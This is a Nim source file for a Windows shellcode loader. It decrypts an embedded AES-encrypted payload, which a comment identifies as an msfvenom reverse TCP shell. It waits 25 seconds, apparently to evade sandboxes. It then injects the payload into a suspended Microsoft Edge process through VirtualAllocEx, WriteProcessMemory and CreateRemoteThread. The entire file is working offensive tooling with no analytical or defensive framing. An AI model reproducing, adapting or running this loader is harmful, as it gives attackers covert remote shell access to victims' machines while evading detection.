import winim/lean
import osproc
import os
import strformat
import dynlib
import base64
import nimcrypto
import nimcrypto/sysrand

proc injectCreateRemoteThread[byte](shellcode: openArray[byte]): void =

    let tProcess = startProcess("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe")
    tProcess.suspend() 
    defer: tProcess.close()

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    # echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

  
    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)



when isMainModule:
    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))
    let
        password: string = "password" # paramStr(1)
        # inFile: string = paramStr(2)
    var
        # readFile(inFile)  ->  for  reading shellcode. In this case, it's directly inserted
        # Shellcode generated with : msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4322 -f nim
        inFileContents: string =  "KVH49xPHlRTWtjj1+5v7L5ZRmcJp8zYTkMunV3zaL8b0CObLjBeUkcJmDJpj5BRJl2onmOLh9GnKPqEvuZ8cxkYA05z3k1l+KCbm5wmNFmgZN02k9vX84BQjHAvcxKbvSbzQuZhls5ET52k9AQ4kN+UU7ZRcb/1C2IyWchfIrsVNORS0uNMDr0yl4UZNWTc0p5/wrsm6J3enJ9CcJ6Ei3S0GaET8KbRG/h4HCywsrfrGv2E77byj0qkIsDaarZ//65ObtIvKpP6OV9FsrZ4e7aJZ4zw+iX2OI9idrYKyAqMi83lBs2STU1bWVIApQIJK5hdhicHbuHKiy8h7aRlhBfpV9x6BU7suvlrp9E8ZNBNEzinDUPpNAW1gewDXPBCV0dT6r6yIdXCl3EnaZ91mit+J/HiUtgcZhrIwJHYkNjI3YzKGB9vj31jcYBAbgrwQYQU36cwSao6dxL3gIpCKoizm6ojtOTbEq8MLxqXS8fsgnYum93HW+dTTO27uN8atFEF7tljBx3qOq3/Yeq/tXCt5BnIjnXo0fncQalZpnoMRbrOG6Omrkp/1Igi+zeMZog3t6uTk3oUigmQPEKrZL6YrE1IBBqIU6IrNHQ==" 
        encrypted: seq[byte] = toByteSeq(decode(inFileContents))
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        decrypted: seq[byte] = newSeq[byte](len(encrypted))
    # Create Static IV
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]

    # echo "decrypted- "
    # echo fmt"{decrypted}"
    # Expand key to 32 bytes using SHA256 as the KDF
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
    sleep(25000)

    dctx.init(key, iv)
    dctx.decrypt(encrypted, decrypted)
    dctx.clear()
    
    injectCreateRemoteThread(decrypted)